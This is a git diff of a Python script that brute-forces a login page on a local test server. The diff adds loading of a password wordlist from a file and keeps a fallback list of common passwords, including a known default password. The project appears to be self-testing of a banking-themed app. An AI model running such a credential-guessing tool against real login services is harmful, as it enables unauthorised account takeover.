@@ -5,14 +5,14 @@ import time
 def try_login(username, password):
     """Attempt to login with given credentials"""
     session = requests.Session()
-    response = session.get("http://localhost:5000/login")
+    response = session.get("http://127.0.0.1:5000/login")
 
     payload = {
         'username': username,
         'password': password
     }
 
-    response = session.post("http://localhost:5000/login", data=payload)
+    response = session.post("http://127.0.0.1:5000/login", data=payload)
     return "Logged in successfully" in response.text
 
 
@@ -75,9 +75,20 @@ def attack_users(usernames, password_list, delay=0.1):
 
     return results
 
+def load_passwords_from_file(filename):
+    """Load passwords from a text file, one password per line"""
+    try:
+        with open(filename, 'r') as file:
+            # Read all lines and strip whitespace
+            passwords = [line.strip() for line in file if line.strip()]
+        print(f"Successfully loaded {len(passwords)} passwords from {filename}")
+        return passwords
+    except Exception as e:
+        print(f"Error loading passwords: {e}")
+        return []
+
 
 if __name__ == "__main__":
-    # Known usernames from your database
     usernames = [
         "user_409000611074",
         "user_409000493201",
@@ -86,16 +97,22 @@ if __name__ == "__main__":
         "12345678"
     ]
 
-    # List of passwords to try, including DefaultPass123 which is used in your db_init.py
-    passwords = [
-        "123456", "password", "123456789", "12345578", "12345",
-        "qwerty", "abc123", "football", "1234567", "monkey",
-        "111111", "letmein", "1234", "1234567890", "dragon",
-        "baseball", "sunshine", "iloveyou", "trustno1", "princess",
-        "admin", "welcome", "666666", "DefaultPass123", "!QAZ2wsx",
-        "password1", "qazwsx", "123qwe", "zxcvbnm", "123456a",
-        "bank123", "secure", "money", "finance", "banking"
-    ]
+    # Load passwords from the most common password txt file
+    password_file = "/Users/in7izmi/PycharmProjects/SecurityTest/common_password_list.txt"  # Change this to your password file path
+    passwords = load_passwords_from_file(password_file)
 
-    # Attack all usernames
+    # If no passwords were loaded we use default
+    if not passwords:
+        print("Using default password list")
+        passwords = [
+            "123456", "password", "123456789", "87654321", "12345",
+            "qwerty", "abc123", "football", "1234567", "monkey",
+            "111111", "letmein", "1234", "1234567890", "dragon",
+            "baseball", "sunshine", "iloveyou", "trustno1", "princess",
+            "admin", "welcome", "666666", "DefaultPass123", "!QAZ2wsx",
+            "password1", "qazwsx", "123qwe", "zxcvbnm", "123456a",
+            "bank123", "secure", "money", "finance", "banking"
+        ]
+
+
     attack_users(usernames, passwords, delay=0.1)
